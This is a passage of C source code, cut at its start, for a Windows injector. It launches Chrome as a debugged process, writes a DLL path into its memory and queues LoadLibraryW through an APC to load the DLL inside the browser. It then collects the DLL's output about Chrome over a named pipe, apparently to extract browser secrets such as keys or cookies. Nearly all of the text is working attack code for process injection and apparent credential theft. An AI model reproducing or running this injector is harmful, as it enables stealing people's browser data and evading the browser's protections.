    SIZE_T                  cbDllPathSize                   = 0x00;
    SIZE_T                  cbBytesWritten                  = 0x00;
    BOOL                    bResult                         = FALSE;

    if (!pChromeData)
        return FALSE;

    if (!InitializeChromeData(pChromeData))
    {
        printf("[!] InitializeChromeData Failed With Error: %lu\n", GetLastError());
        return FALSE;
    }

    if (!(szChromePath = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_PATH * sizeof(WCHAR))))
    {
        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!(szDllPath = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_PATH * sizeof(WCHAR))))
    {
        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!GetChromePath(szChromePath, MAX_PATH))
        goto _END_OF_FUNC;

    printf("[+] Found Chrome: %ws\n", szChromePath);

    if (!GetDllPath(szDllPath, MAX_PATH))
        goto _END_OF_FUNC;

    printf("[+] DLL Path: %ws\n", szDllPath);

    cbDllPathSize = (lstrlenW(szDllPath) + 1) * sizeof(WCHAR);

    GetPipeName(szPipeName, BUFFER_SIZE_32);

    if ((hPipe = CreateNamedPipeA(szPipeName, PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, BUFFER_SIZE_8192, BUFFER_SIZE_8192, 0, NULL)) == INVALID_HANDLE_VALUE)
    {
        printf("[!] CreateNamedPipeA Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    PipeContext.hPipe       = hPipe;
    PipeContext.pChromeData = pChromeData;

    if (!(hPipeThread = CreateThread(NULL, 0x00, PipeReaderThread, &PipeContext, 0x00, NULL)))
    {
        printf("[!] CreateThread Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!CreateAlertableProcess(szChromePath, STR_CHROME_ARGS, &ProcessInfo) || !ProcessInfo.hProcess)
        goto _END_OF_FUNC;

    printf("[+] Created Chrome.exe Process With ID: %lu\n", ProcessInfo.dwProcessId);
    
    if (!(pRemoteDllPath = VirtualAllocEx(ProcessInfo.hProcess, NULL, cbDllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
    {
        printf("[!] VirtualAllocEx Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!WriteProcessMemory(ProcessInfo.hProcess, pRemoteDllPath, szDllPath, cbDllPathSize, &cbBytesWritten))
    {
        printf("[!] WriteProcessMemory Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!QueueUserAPC((PAPCFUNC)LoadLibraryW, ProcessInfo.hThread, (ULONG_PTR)pRemoteDllPath))
    {
        printf("[!] QueueUserAPC Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!DebugActiveProcessStop(ProcessInfo.dwProcessId))
    {
        printf("[!] DebugActiveProcessStop Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    printf("[+] Injection Complete! Waiting For DLL Output...\n");

    switch (WaitForSingleObject(hPipeThread, PIPE_THREAD_TIMEOUT))
    {
        case WAIT_TIMEOUT:
            printf("[!] Pipe Thread Timed Out\n\n");
        case WAIT_OBJECT_0:
            printf("[*] Pipe Connection Closed\n\n");
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (hPipeThread)
        CloseHandle(hPipeThread);
    if (ProcessInfo.hThread)
        CloseHandle(ProcessInfo.hThread);
    if (ProcessInfo.hProcess)
    {
        TerminateProcess(ProcessInfo.hProcess, 0x00);
        CloseHandle(ProcessInfo.hProcess);
    }
    HEAP_FREE(szDllPath);
    HEAP_FREE(szChromePath);
    
    return bResult;
}
